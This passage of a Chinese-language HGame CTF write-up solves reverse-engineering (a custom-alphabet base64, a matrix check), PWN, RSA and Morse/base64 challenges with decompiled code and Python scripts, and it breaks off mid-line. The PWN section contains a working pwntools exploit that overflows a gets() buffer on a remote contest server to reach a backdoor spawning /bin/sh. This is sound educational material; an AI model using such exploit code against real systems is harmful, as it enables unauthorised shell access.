<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 len; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> len0; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v7; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> flag; <span class="comment">// [rsp+20h] [rbp-118h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"please input you flag:\n"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;flag, <span class="number">0</span>, <span class="number">0x100</span>ui64);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;flag, <span class="number">100</span>i64);</span><br><span class="line">  len = <span class="built_in">strlen</span>(&amp;flag);                          <span class="comment">// 如果输入的字符串少于256个字符，则返回字符串长度，否则返回256（0x100）</span></span><br><span class="line">  len0 = len;</span><br><span class="line">  <span class="keyword">if</span> ( !len )                                   <span class="comment">// 若输入空字符串，直接报错</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_6:</span><br><span class="line">    v7 = <span class="string">"try again\n"</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = sub_140002000(len);                      </span><br><span class="line">  v6 = <span class="built_in">malloc</span>(v5);								<span class="comment">// 分配空间</span></span><br><span class="line">  cryption(v6, (__int64)&amp;flag, len0);           <span class="comment">// 加密算法部分</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(v6, <span class="string">"0g371wvVy9qPztz7xQ+PxNuKxQv74B/5n/zwuPfX"</span>, <span class="number">0x64</span>ui64) )<span class="comment">// 相同则返回0，跳过if，输出get it，flag正确</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">      <span class="built_in">free</span>(v6);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = <span class="string">"get it\n"</span>;</span><br><span class="line">LABEL_7:</span><br><span class="line">  <span class="built_in">puts</span>(v7);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//最重要的cryption加密函数</span></span><br><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">sub_140001EB0</span><span class="params">(_BYTE *a1, __int64 a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// er10</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbx</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// rdi</span></span><br><span class="line">  _BYTE *v7; <span class="comment">// r9</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v8; <span class="comment">// r11</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// cl</span></span><br><span class="line">  <span class="comment">// a1是加密后输出内容的首地址，a2是输入的flag的首地址，a3是flag长度</span></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = a3 - <span class="number">2</span>;</span><br><span class="line">  v5 = a2;</span><br><span class="line">  v6 = a1;</span><br><span class="line">  v7 = a1;</span><br><span class="line">  <span class="keyword">if</span> ( v4 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = a2 + <span class="number">1</span>;</span><br><span class="line">    v9 = ((<span class="keyword">unsigned</span> __int64)((<span class="keyword">unsigned</span> __int64)(v4 - <span class="number">1</span>) * (<span class="keyword">unsigned</span> __int128)<span class="number">0xAAAAAAAAAAAAAAAB</span>ui64 &gt;&gt; <span class="number">64</span>) &gt;&gt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">    v3 = <span class="number">3</span> * v9;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v10 = *(<span class="keyword">unsigned</span> __int8 *)(v8 - <span class="number">1</span>);</span><br><span class="line">      v8 += <span class="number">3</span>i64;</span><br><span class="line">      *v7 = alphabet[v10 &gt;&gt; <span class="number">2</span>];</span><br><span class="line">      v7[<span class="number">1</span>] = alphabet[((<span class="keyword">unsigned</span> __int64)*(<span class="keyword">unsigned</span> __int8 *)(v8 - <span class="number">3</span>) &gt;&gt; <span class="number">4</span>) | <span class="number">16</span>i64 * (*(_BYTE *)(v8 - <span class="number">4</span>) &amp; <span class="number">3</span>)];</span><br><span class="line">      v7[<span class="number">2</span>] = alphabet[<span class="number">4</span>i64 * (*(_BYTE *)(v8 - <span class="number">3</span>) &amp; <span class="number">0xF</span>) | ((<span class="keyword">unsigned</span> __int64)*(<span class="keyword">unsigned</span> __int8 *)(v8 - <span class="number">2</span>) &gt;&gt; <span class="number">6</span>)];</span><br><span class="line">      v7[<span class="number">3</span>] = alphabet[*(_BYTE *)(v8 - <span class="number">2</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">      v7 += <span class="number">4</span>;</span><br><span class="line">      --v9;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v9 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    *v7 = alphabet[(<span class="keyword">unsigned</span> __int64)*(<span class="keyword">unsigned</span> __int8 *)(v3 + v5) &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v3 == a3 - <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = <span class="number">61</span>;</span><br><span class="line">      v7[<span class="number">1</span>] = alphabet[<span class="number">16</span> * (*(_BYTE *)(v3 + v5) &amp; <span class="number">3</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7[<span class="number">1</span>] = alphabet[((<span class="keyword">unsigned</span> __int64)*(<span class="keyword">unsigned</span> __int8 *)(v5 + v3 + <span class="number">1</span>) &gt;&gt; <span class="number">4</span>) | <span class="number">16</span>i64 * (*(_BYTE *)(v3 + v5) &amp; <span class="number">3</span>)];</span><br><span class="line">      v11 = alphabet[<span class="number">4</span> * (*(_BYTE *)(v5 + v3 + <span class="number">1</span>) &amp; <span class="number">0xF</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    v7[<span class="number">2</span>] = v11;</span><br><span class="line">    v7[<span class="number">3</span>] = <span class="number">61</span>;</span><br><span class="line">    v7 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v7 - v6 + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里进行了很多操作，逆向起来很复杂而且工作量和难度都很多大，于是寻求别的方法，发现所有的操作都是围绕alphabet这一个字符数组来的，所以找到这个数组</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alphabet=<span class="string">'abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br></pre></td></tr></table></figure>

<p>观察发现这个数组非常熟悉，和base64的字母表完全一样，只是字符调换了顺序，然后观察最后的目标字符串，猜想这可能是改变字母表之后的base64编码，所以将之前的base64解码程序字母表修改为本题所提供的字母表，运行程序获得flag，所以猜想是正确的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b64de</span><span class="params">(path_in, path_out)</span>:</span></span><br><span class="line">    b64_str = open(path_in).read()</span><br><span class="line">    charset = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span><br><span class="line">    <span class="comment"># print(charset)</span></span><br><span class="line">    bin_str = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> b64_str:</span><br><span class="line">        <span class="keyword">if</span> i != <span class="string">'='</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = str(bin(charset.index(i))).replace(<span class="string">'0b'</span>, <span class="string">''</span>)</span><br><span class="line">            <span class="keyword">except</span> ValueError:</span><br><span class="line">                print(i)</span><br><span class="line">            bin_str.append(<span class="string">'&#123;:0&gt;6&#125;'</span>.format(x))  <span class="comment"># 填充成6位</span></span><br><span class="line">            <span class="comment"># print(bin_str)</span></span><br><span class="line">    b64_bin = bytearray()  <span class="comment"># 最后只能写入bytes</span></span><br><span class="line">    nums = len(bin_str) // <span class="number">4</span></span><br><span class="line">    remain = len(bin_str) % <span class="number">4</span></span><br><span class="line">    fore_part = bin_str[:<span class="number">4</span> * nums]  <span class="comment"># 四个一组截取</span></span><br><span class="line">    <span class="comment"># print(fore_part)</span></span><br><span class="line">    <span class="keyword">while</span> fore_part:</span><br><span class="line">        <span class="comment"># 取4个6位base64字符，作为3个字节</span></span><br><span class="line">        b64_tmp = <span class="string">''</span>.join(fore_part[:<span class="number">4</span>])  <span class="comment"># 4*6/8</span></span><br><span class="line"></span><br><span class="line">        b64_tmp = [int(b64_tmp[x: x + <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">8</span>, <span class="number">16</span>]]  <span class="comment"># 转换成10进制</span></span><br><span class="line">        <span class="comment"># print(b64_tmp)</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> b64_tmp:</span><br><span class="line">            b64_bin.append(i)</span><br><span class="line">        fore_part = fore_part[<span class="number">4</span>:]  <span class="comment"># 向后移动四位</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> remain:</span><br><span class="line">        remain_part = <span class="string">''</span>.join(bin_str[nums * <span class="number">4</span>:])</span><br><span class="line">        <span class="comment"># print(remain_part)</span></span><br><span class="line">        tmp = [int(remain_part[i * <span class="number">8</span>:(i + <span class="number">1</span>) * <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(remain - <span class="number">1</span>)]</span><br><span class="line">        <span class="comment"># print(tmp)</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">            b64_bin.append(i)</span><br><span class="line">    <span class="comment"># print(b64_bin)</span></span><br><span class="line">    fd = open(path_out, <span class="string">'wb'</span>)</span><br><span class="line">    fd.write(b64_bin)</span><br><span class="line">    fd.close()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    b64de(<span class="string">"./pic_en.txt"</span>, <span class="string">"./pic_de.txt"</span>)</span><br></pre></td></tr></table></figure>

<p>输出的flag为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;b45e6a_i5_50_eazy_6VVSQ&#125;</span><br></pre></td></tr></table></figure>

<h4 id="cpp"><a href="#cpp" class="headerlink" title="cpp"></a>cpp</h4><p>这题函数实在是太多，而且应该是万恶的出题人故意把函数标识去掉了，理解起来简直窒息，但是逆向这个东西，七分理解三分猜，于是开猜</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">sub_140002AE0((__int64)&amp;v13);                 <span class="comment">// 大概是string类的构造函数</span></span><br><span class="line"> sub_1400018D0(<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v13);                <span class="comment">// cin&gt;&gt;v13</span></span><br><span class="line"> v15 = <span class="string">"hgame&#123;"</span>;</span><br><span class="line"> sub_140002B30((__int64)&amp;v14);</span><br><span class="line"> <span class="keyword">if</span> ( find_sub(&amp;v13, v15, <span class="number">0</span>i64) || find_sub(&amp;v13, <span class="string">"&#125;"</span>, <span class="number">0</span>i64) != <span class="number">61</span> )<span class="comment">// 猜测输入字符串长度位62，格式位hgame&#123;***&#125;</span></span><br><span class="line"> &#123;</span><br><span class="line">   v5 = sub_140001900(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"error"</span>);</span><br><span class="line">   <span class="built_in">std</span>::basic_ostream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;(v5, sub_140002830);</span><br><span class="line">   sub_140003010(&amp;v14);</span><br><span class="line">   sub_140002FA0(&amp;v13);</span><br><span class="line">   result = <span class="number">0</span>i64;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">for</span> ( i = <span class="number">6</span>i64; ; i = v11 + <span class="number">1</span> )             <span class="comment">// 一波操作完全看不懂，猜测是根据'_'来分割字符串，分割成9个数</span></span><br><span class="line">   &#123;</span><br><span class="line">     LOBYTE(v0) = <span class="string">'_'</span>;</span><br><span class="line">     v11 = find(&amp;v13, v0, i);</span><br><span class="line">     <span class="keyword">if</span> ( v11 == <span class="number">-1</span> )</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">     v16 = sub_1400043B0(&amp;v13, &amp;v40, i, v11 - i);</span><br><span class="line">     v17 = v16;</span><br><span class="line">     v1 = sub_140003E80(v16);</span><br><span class="line">     v18 = atoll(v1);</span><br><span class="line">     sub_140004350(&amp;v14, &amp;v18);</span><br><span class="line">     sub_140002FA0(&amp;v40);</span><br><span class="line">   &#125;</span><br><span class="line">   v19 = sub_1400043B0(&amp;v13, &amp;v41, i, <span class="number">61</span> - i);</span><br><span class="line">   v20 = v19;</span><br><span class="line">   v2 = sub_140003E80(v19);</span><br><span class="line">   v21 = atoll(v2);                            <span class="comment">// 直接把字符串转换成长整型，说明字符串里就是以'_'连接的数字</span></span><br><span class="line">   sub_140004350(&amp;v14, &amp;v21);</span><br><span class="line">   sub_140002FA0(&amp;v41);</span><br><span class="line">   v31 = <span class="number">26727</span>i64;                             <span class="comment">// 根据下面的运算这里应该是两个矩阵</span></span><br><span class="line">   v32 = <span class="number">24941</span>i64;</span><br><span class="line">   v33 = <span class="number">101</span>i64;</span><br><span class="line">   v34 = <span class="number">29285</span>i64;</span><br><span class="line">   v35 = <span class="number">26995</span>i64;</span><br><span class="line">   v36 = <span class="number">29551</span>i64;</span><br><span class="line">   v37 = <span class="number">29551</span>i64;</span><br><span class="line">   v38 = <span class="number">25953</span>i64;</span><br><span class="line">   v39 = <span class="number">29561</span>i64;</span><br><span class="line">   v22 = <span class="number">1</span>i64;</span><br><span class="line">   v23 = <span class="number">0</span>i64;</span><br><span class="line">   v24 = <span class="number">1</span>i64;</span><br><span class="line">   v25 = <span class="number">0</span>i64;</span><br><span class="line">   v26 = <span class="number">1</span>i64;</span><br><span class="line">   v27 = <span class="number">1</span>i64;</span><br><span class="line">   v28 = <span class="number">1</span>i64;</span><br><span class="line">   v29 = <span class="number">2</span>i64;</span><br><span class="line">   v30 = <span class="number">2</span>i64;</span><br><span class="line">   <span class="keyword">for</span> ( j = <span class="number">0</span>i64; j &lt; <span class="number">3</span>; ++j )                <span class="comment">// 三个for循环时矩阵运算，如果满足条件就直接输出正确</span></span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">for</span> ( k = <span class="number">0</span>i64; k &lt; <span class="number">3</span>; ++k )</span><br><span class="line">     &#123;</span><br><span class="line">       v12 = <span class="number">0</span>i64;</span><br><span class="line">       <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; <span class="number">3</span>; ++l )</span><br><span class="line">         v12 += *(&amp;v22 + <span class="number">3</span> * l + k) * *(_QWORD *)sub_1400031E0(&amp;v14, l + <span class="number">3</span> * j);</span><br><span class="line">       <span class="keyword">if</span> ( *(&amp;v31 + <span class="number">3</span> * j + k) != v12 )</span><br><span class="line">       &#123;</span><br><span class="line">         v3 = sub_140001900(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"error"</span>);</span><br><span class="line">         <span class="built_in">std</span>::basic_ostream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;(v3, sub_140002830);</span><br><span class="line">         sub_140003010(&amp;v14);</span><br><span class="line">         sub_140002FA0(&amp;v13);</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   v6 = sub_140001900(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"you are good at re"</span>);</span><br><span class="line">   <span class="built_in">std</span>::basic_ostream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;(v6, sub_140002830);</span><br></pre></td></tr></table></figure>

<p>最主要的部分（假装）分析一遍，发现只需要矩阵求逆和矩阵乘法，就可以得到flag</p>
<p>尝试一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">a = np.array([[<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>]])</span><br><span class="line">b = np.linalg.inv(a)</span><br><span class="line"><span class="comment"># print(b)</span></span><br><span class="line"><span class="comment"># print(np.dot(a,b))</span></span><br><span class="line">c = np.array([[<span class="number">26727</span>, <span class="number">24941</span>, <span class="number">101</span>], [<span class="number">29285</span>, <span class="number">26995</span>, <span class="number">29551</span>], [<span class="number">29551</span>, <span class="number">25953</span>, <span class="number">29561</span>]])</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">d = np.dot(c, b)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        flag += str(int(d.item(i, j))) + <span class="string">'_'</span></span><br><span class="line">flag = <span class="string">'hgame&#123;'</span> + flag[:<span class="number">-1</span>] + <span class="string">'&#125;'</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>提交提示成功，猜测正确</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;-24840_-78193_51567_2556_-26463_26729_3608_-25933_25943&#125;</span><br></pre></td></tr></table></figure>



<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h4><p>IDA反编译</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-ACh]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+7Bh] [ebp-31h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+A0h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+A4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  alarm(<span class="number">8u</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0xA0</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Let's 0O0o\\0O0!"</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(<span class="string">"0O0o"</span>, &amp;v5, <span class="number">7u</span>) )</span><br><span class="line">    backdoor();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//backdoor</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以最终的目标是运行backdoor()，所以只需要进入if分支就可以了，即v5和前面的字符串相等，自然想到输入s覆盖v5的值，不过需要注意的是，memcmp函数比较了7位，所以还要找到后面的几个字节，形成payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">"47.103.214.163"</span>,<span class="string">"20000"</span>)</span><br><span class="line"><span class="comment">#io=process("./Hard_AAAAA")</span></span><br><span class="line">io.recvuntil(<span class="string">"Let's 0O0o\\0O0!"</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">123</span>+<span class="string">'0O0o\0O0'</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>最终得到flag：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;0OoO0oo0O0Oo&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="InfantRSA"><a href="#InfantRSA" class="headerlink" title="InfantRSA"></a>InfantRSA</h4><p>简单的RSA解密，p和q都已经分解出来了，其它的没什么难度</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcdext</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    a: 模的取值</span></span><br><span class="line"><span class="string">    b: 想求逆的值</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    x, y, gcd = gcdext(b, a % b)</span><br><span class="line">    <span class="keyword">return</span> y, x - a // b * y, gcd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="number">275698465082361070145173688411496311542172902608559859019841</span></span><br><span class="line">p = <span class="number">681782737450022065655472455411</span></span><br><span class="line">q = <span class="number">675274897132088253519831953441</span></span><br><span class="line">e = <span class="number">13</span></span><br><span class="line">n = p * q</span><br><span class="line"><span class="comment"># print(k)</span></span><br><span class="line">fai = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">(d, k, g) = gcdext(e, fai)</span><br><span class="line"><span class="comment"># print(fai)</span></span><br><span class="line"><span class="comment"># print(k)</span></span><br><span class="line"><span class="comment"># print(m)</span></span><br><span class="line">m = pow(c, d, n)</span><br><span class="line"><span class="comment"># print(m)</span></span><br><span class="line">f = m.to_bytes(<span class="number">22</span>, byteorder=<span class="string">'big'</span>)</span><br><span class="line">print(f)</span><br></pre></td></tr></table></figure>

<p>直接求解出来flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;t3Xt6O0k_R5A!!!&#125;</span><br></pre></td></tr></table></figure>



<h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="欢迎参加HGame！"><a href="#欢迎参加HGame！" class="headerlink" title="欢迎参加HGame！"></a>欢迎参加HGame！</h4><p>首先看到一长串似曾相识的东西</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t</span><br></pre></td></tr></table></figure>

<p>像是摩斯电码base64加密之后的东西</p>
<p>所以base64解码之后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...--</span><br></pre></td></tr></table></figure>

<p>果然是摩斯电码，然后解摩斯电码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line">CODE = &#123;<span class="string">'A'</span>: <span class="string">'.-'</span>, <span class="string">'B'</span>: <span class="string">'-...'</span>, <span class="string">'C'</span>: <span class="string">'-.-.'</span>,</span><br><span class="line">        <span class="string">'D'</span>: <span class="string">'-..'</span>, <span class="string">'E'</span>: <span class="string">'.'</span>, <span class="string">'F'</span>: <span class="string">'..-.'</span>,</span><br><span class="line">        <span class="string">'G'</span>: <span class="string">'--.'</span>, <span class="string">'H'</span>: <span class="string">'....'</span>, <span class="string">'I'</span>: <span class="string">'..'</span>,</span><br><span class="line">        <span class="string">'J'</span>: <span class="string">'.---'</span>, <span class="string">'K'</span>: <span class="string">'-.-'</span>, <span class="string">'L'</span>: <span class="string">'.-..'</span>,</span><br><span class="line">        <span class="string">'M'</span>: <span class="string">'--'</span>, <span class="string">'N'</span>: <span class="string">'-.'</span>, <span class="string">'O'</span>: <span class="string">'---'</span>,</span><br><span class="line">        <span class="string">'P'</span>: <span class="string">'.--.'</span>, <span class="string">'Q'</span>: <span class="string">'--.-'</span>, <span class="string">'R'</span>: <span class="string">'.-.'</span>,</span><br><span class="line">        <span class="string">'S'</span>: <span class="string">'...'</span>, <span class="string">'T'</span>: <span class="string">'-'</span>, <span class="string">'U'</span>: <span class="string">'..-'</span>,</span><br><span class="line">        <span class="string">'V'</span>: <span class="string">'...-'</span>, <span class="string">'W'</span>: <span class="string">'.--'</span>, <span class="string">'X'</span>: <span class="string">'-..-'</span>,</span><br><span class="line">        <span class="string">'Y'</span>: <span class="string">'-.--'</span>, <span class="string">'Z'</span>: <span class="string">'--..'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">'0'</span>: <span class="string">'-----'</span>, <span class="string">'1'</span>: <span class="string">'.----'</span>, <span class="string">'2'</span>: <span class="string">'..---'</span>,</span><br><span class="line">        <span class="string">'3'</span>: <span class="string">'...--'</span>, <span class="string">'4'</span>: <span class="string">'....-'</span>, <span class="string">'5'</span>: <span class="string">'.....'</span>,</span><br><span class="line">        <span class="string">'6'</span>: <span class="string">'-....'</span>, <span class="string">'7'</span>: <span class="string">'--...'</span>, <span class="string">'8'</span>: <span class="string">'---..'</span>,</span><br><span class="line">        <span class="string">'9'</span>: <span class="string">'----.'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">'.'</span>: <span class="string">'.-.-.-'</span>, <span class="string">':'</span>: <span class="string">'---...'</span>, <span class="string">','</span>: <span class="string">'--..--'</span>, <span class="string">';'</span>: <span class="string">'-.-.-.'</span>,</span><br><span class="line">        <span class="string">'?'</span>: <span class="string">'..--..'</span>, <span class="string">'='</span>: <span class="string">'-...-'</span>, <span class="string">'\''</span>: <span class="string">'.----.'</span>, <span class="string">'/'</span>: <span class="string">'-..-.'</span>,</span><br><span class="line">        <span class="string">'!'</span>: <span class="string">'-.-.--'</span>, <span class="string">'-'</span>: <span class="string">'-....-'</span>, <span class="string">'_'</span>: <span class="string">'..--.-'</span>, <span class="string">'"'</span>: <span class="string">'.-..-.'</span>,</span><br><span class="line">        <span class="string">'('</span>: <span class="string">'-.--.'</span>, <span class="string">')'</span>: <span class="string">'-.--.-'</span>, <span class="string">'$'</span>: <span class="string">'...-..-'</span>, <span class="string">'&amp;'</span>: <span class="string">'.-...'</span>,</span><br><span class="line">        <span class="string">'@'</span>: <span class="string">'.--.-.'</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decode</span><span class="params">(str)</span>:</span></span><br><span class="line">    Decode_value = CODE.keys()</span><br><span class="line">    Decode_key = CODE.values()</span><br><span class="line">    Decode_dict = dict(zip(Decode_key, Decode_value))</span><br><span class="line"></span><br><span class="line">    text = <span class="string">''</span></span><br><span class="line">    msg = str.split(<span class="string">' '</span>)</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> msg:</span><br><span class="line">        <span class="keyword">if</span> s <span class="keyword">in</span> Decode_dict.keys():</span><br><span class="line">            text += Decode_dict[s]</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(Decode(<span class="string">'.-- ...-- .-.. -.-. ----- -- . 